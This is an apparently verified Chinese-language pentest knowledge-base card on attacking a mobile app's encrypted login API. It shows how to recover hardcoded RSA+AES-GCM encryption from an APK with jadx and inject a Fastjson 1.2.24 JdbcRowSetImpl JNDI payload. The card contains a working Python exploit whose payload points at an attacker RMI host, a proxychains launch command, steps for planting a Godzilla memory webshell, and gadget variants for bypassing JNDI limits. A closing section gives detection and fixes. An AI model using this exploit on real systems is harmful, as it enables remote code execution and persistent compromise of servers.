---
id: web-java-deser-fastjson-apk-hybrid-rsa-aes-gcm-login
title: APK 逆向复现 RSA+AES-GCM 加密登录：向 Fastjson 1.2.24 接口注入 JdbcRowSetImpl
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: mobile-apk-hybrid-crypto-fastjson-replay
tags:
- java
- fastjson
- android
- apk
- jadx
- rsa
- aes-gcm
- jndi
- jdbcrowsetimpl
- encrypted-param
- mobile
cve: []
severity: critical
confidence: high
status: verified
affected_versions: Fastjson 1.2.24（原文 APK 内置版本；后端实测可利用）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T17:54:56+08:00'
  notes: 已对照原文与图13-21核对：图14 政务移动端登录页，图15 Burp 抓到 /api/login 的 X-Encrypted-Key 加密请求，图16 jadx 显示 com.alibaba.fastjson JSON.VERSION="1.2.24" 及 sendLoginRequest 线索，图17 java-chains 启动(8011)，图18/19 JNDIRMIDeserializePayload 生成 rmi://127.0.0.1:50388/931789，图20/21 哥斯拉内存马连接 172.16.22.88:8080 成功；卡内 AES-128-GCM(IV12+ct+tag16)、RSA/ECB/PKCS1、X-Encrypted-Key、Python PoC 与原文一致。affected_versions=Fastjson 1.2.24 来自图16 APK 内置 VERSION，保留。未验证点：服务端 JSON.parseObject 调用链为据利用成功推断，原文未贴后端源码；未复跑 PoC。frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-apk-hybrid-rsa-aes-gcm-login/
draft: false
kb_aliases:
- APK 加密接口 Fastjson
- RSA+AES-GCM 登录加密复现
- 移动端加密参数反序列化
- jadx 提取硬编码 RSA 公钥
- X-Encrypted-Key
- 加密登录接口 JNDI 注入
---

## 一句话结论

移动端 App 把登录 JSON 用随机 AES 密钥做 AES/GCM 加密、再用硬编码 RSA 公钥加密 AES 密钥后发送；攻击者用 jadx 反编译 APK 复原算法与公钥，就能自行加密任意 JSON，把 Fastjson `@type:JdbcRowSetImpl` 的 JNDI payload 送进后端 `/api/login`，触发反序列化并注入内存马。

## 原理

- 移动端为了保护登录参数，常实现“混合加密”：客户端随机生成 128-bit AES 密钥，用 `AES/GCM/NoPadding` 加密业务 JSON（输出 `IV(12B) + 密文 + GCM Tag(16B)`），再用服务端 RSA 公钥以 `RSA/ECB/PKCS1Padding` 加密 AES 密钥；请求体为 Base64 密文，`X-Encrypted-Key` 头为 Base64 的 RSA 密文。
- 该方案只保护传输机密性，不构成认证边界：RSA 公钥硬编码在 APK 中（公钥本就是公开的），AES 密钥由客户端随机选择，攻击者完全可以按同样格式加密任意明文。
- 服务端解密后若直接把明文交给 Fastjson `JSON.parseObject`，且 Fastjson 为 1.2.24 等存在 AutoType 的版本，则 `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker/xxx","autoCommit":true}` 会触发 JNDI 查找并加载远程恶意类。
- 原文从内网资源下载中心拿到 APK，jadx 中确认 `MainActivity.sendLoginRequest` 的加密逻辑、硬编码 RSA 公钥、`/api/login` 地址，并在 `classes5.dex` 中看到 Fastjson 1.2.24；用 Python 复现加密后通过代理发送 payload，成功注入哥斯拉内存马。
- 之所以成立：加密层只做编码/保密，不改变反序列化 sink；移动端逆向把“黑盒加密接口”变成可编程客户端。

## 触发条件

- 能获取目标移动端 APK（内网下载中心、应用市场、二维码等），且未被强混淆到无法定位加密逻辑。
- 后端接口在解密后调用 Fastjson `parseObject`/`parse`，版本存在 AutoType/JNDI 利用面（原文为 1.2.24）。
- 攻击者能访问后端接口（可经 SOCKS 代理进入内网）。
- 目标可出网访问攻击者的 RMI/LDAP 服务，或存在本地 gadget 可替代 JNDI。
- 加密算法/公钥可从 APK 中恢复（硬编码或可推导）。

## 利用步骤

1. 获取并反编译 APK：
   ```bash
   jadx-gui target.apk
   ```
   定位 `MainActivity.sendLoginRequest` 或网络层，记录：
   - 请求地址（如 `/api/login`）；
   - AES 模式/填充/IV/tag 拼接顺序；
   - RSA 公钥（硬编码 Base64）；
   - 加密后 body 与 `X-Encrypted-Key` 头的编码方式。
2. 确认后端 JSON 解析器与版本：在 APK 的 `classes*.dex` 中搜索 `com.alibaba.fastjson`、`VERSION`（原文为 1.2.24）。
3. 准备 JNDI/RMI 服务与恶意类/内存马载荷（可用 java-chains 生成 JNDI 链，或自建 RMI/LDAP 服务）。
4. 编写脚本复现加密并发送 payload：
   - 生成随机 16 字节 AES key 与 12 字节 IV；
   - `AES/GCM` 加密 Fastjson payload，拼接 `IV + 密文 + tag` 后 Base64；
   - 用 APK 中 RSA 公钥 `RSA/ECB/PKCS1` 加密 AES key，Base64 放入 `X-Encrypted-Key`；
   - POST 到 `/api/login`。
5. 通过 SOCKS 代理发送，观察 JNDI 回连；随后用哥斯拉/冰蝎连接注入的内存马。

## PoC

```python
import base64, os, requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

URL = "http://target:8080/api/login"
RSA_PUB = "<从 APK 提取的 Base64 RSA 公钥>"
payload = '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:50388/xxx","autoCommit":true}'

aes_key, iv = os.urandom(16), os.urandom(12)
enc = Cipher(algorithms.AES(aes_key), modes.GCM(iv)).encryptor()
ct = enc.update(payload.encode()) + enc.finalize()
body = base64.b64encode(iv + ct + enc.tag).decode()

pub = serialization.load_der_public_key(base64.b64decode(RSA_PUB))
key_enc = base64.b64encode(pub.encrypt(aes_key, padding.PKCS1v15())).decode()

r = requests.post(URL, data=body.encode(),
                  headers={"Content-Type": "application/octet-stream",
                           "X-Encrypted-Key": key_enc})
print(r.status_code, r.text)
```

```bash
proxychains -q python3 exp.py
```

## 变体与关联

- 变体：AES 模式可能是 CBC/ECB，IV 位置/长度不同；RSA 可能是 OAEP；需按 APK 实际实现调整。
- 变体：若 JNDI 被 JDK 高版本限制，可改用 Fastjson 本地 gadget（TemplatesImpl、C3P0、BCEL 等）或 1.2.47 类缓存绕过。
- 变体：除登录接口外，注册、找回密码、支付等使用同一加密封装的接口也可能是 Fastjson sink；可批量测试。
- 变体：用 Frida hook 客户端加密函数直接生成密文，省去逆向算法细节。
- 关联：[[web-java-deser-fastjson-encrypted-param-aes-wrapper]]（加密参数入口的通用思路）、[[web-java-deser-fastjson-jdbcrowsetimpl-jndi]]（JdbcRowSetImpl 触发 JNDI）、[[web-java-deser-fastjson-1-2-47-class-cache-bypass]]（高版本类缓存绕过）、[[pentest-c2-donut-pe-to-shellcode-c-loader]]（载荷投递）。
- 边界：后端已升级 Fastjson 并关闭 AutoType、解密后做严格 JSON 结构校验、JNDI 出网被禁且无本地 gadget、APK 强混淆/加固导致算法不可恢复时，利用失败。

## 检测与防御

- 检测：`/api/login` 等接口出现解密后含 `@type`、`JdbcRowSetImpl`、`dataSourceName`、`rmi://`/`ldap://` 的请求；服务端向外部 RMI/LDAP 端口发起连接；Godzilla/冰蝎内存马特征；同一来源在登录接口高频发送异常大 body。
- 修复：升级 Fastjson 并关闭 AutoType（`ParserConfig.getGlobalInstance().setAutoTypeSupport(false)`，使用 safeMode）；对解密后的 JSON 做严格 schema 校验，拒绝 `@type` 字段。
- 加固：移动端不要把“客户端可控密钥的加密”当作安全边界；RSA 公钥可公开，但应对请求做签名/防重放；限制服务端出网与 JNDI；对反序列化接口做白名单与 RASP 防护。
